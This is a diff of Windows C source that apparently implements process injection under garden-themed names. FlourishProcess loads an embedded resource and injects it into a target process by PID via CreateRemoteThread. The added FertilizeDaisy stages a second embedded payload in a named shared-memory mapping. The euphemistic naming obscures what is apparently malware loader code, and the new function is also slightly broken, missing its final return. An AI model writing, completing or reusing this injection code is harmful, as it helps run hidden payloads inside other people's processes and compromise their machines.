@@ -1,6 +1,7 @@
 #include "bloom.h"
 #include "report.h"
 #include "resource.h"
+#include "filemap.h"
 
 BOOL FlourishProcess(DWORD pid)
 {
@@ -11,19 +12,11 @@ BOOL FlourishProcess(DWORD pid)
         return FALSE;
     }
 
-    HRSRC resource = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_FLOURISH), RT_RCDATA);
-    if (resource == NULL)
+    void* buffer = NULL;
+    DWORD size = 0;
+    if (!FetchResource(IDR_FLOURISH, &buffer, &size))
     {
-        ReportFail(L"[flourish] not found");
-        return TRUE;
-    }
-
-    HGLOBAL loaded = LoadResource(NULL, resource);
-    DWORD size = SizeofResource(NULL, resource);
-    void* buffer = LockResource(loaded);
-    if (loaded == NULL || buffer == NULL || size == 0)
-    {
-        ReportFail(L"[flourish] is empty");
+        ReportFail(L"failed to load [flourish] buffer");
         return TRUE;
     }
 
@@ -57,4 +50,23 @@ BOOL FlourishProcess(DWORD pid)
     ReportFail(L"CreateRemoteThread failed for process %lu", pid);
     CloseHandle(process);
     return FALSE;
+}
+
+BOOL FertilizeDaisy(void)
+{
+    void* buffer = NULL;
+    DWORD size = 0;
+    if (!FetchResource(IDR_FERTILIZER, &buffer, &size))
+    {
+        ReportFail(L"failed to load [IDR_FERTILIZER] buffer");
+        return TRUE;
+    }
+    
+    HANDLE hMapFile = FileMapCreate(CONFIG_FERTILIZER_MAPPING_NAME, buffer, size);
+    if (hMapFile == NULL)
+    {
+        ReportFail(L"FileMapCreate failed: %lu", GetLastError());
+        return 1;
+    }
+    ReportSuccess(L"created the [fertilizer]");
 }
